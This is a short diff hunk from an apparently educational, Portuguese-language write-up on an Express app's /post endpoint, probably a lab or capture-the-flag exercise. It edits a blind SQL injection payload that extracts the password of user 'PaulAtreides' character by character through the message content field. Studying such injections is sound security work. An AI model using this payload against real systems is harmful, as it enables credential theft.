@@ -69,7 +69,7 @@ app.post("/post", (req, res) => {
 Ao postar uma mensagem, você pode usar o seguinte payload no campo de conteúdo para extrair informações de senha caractere por caractere:
 
 ```
-Teste', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) --
+Teste', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) -- '
 ```
 
 Esta injeção:
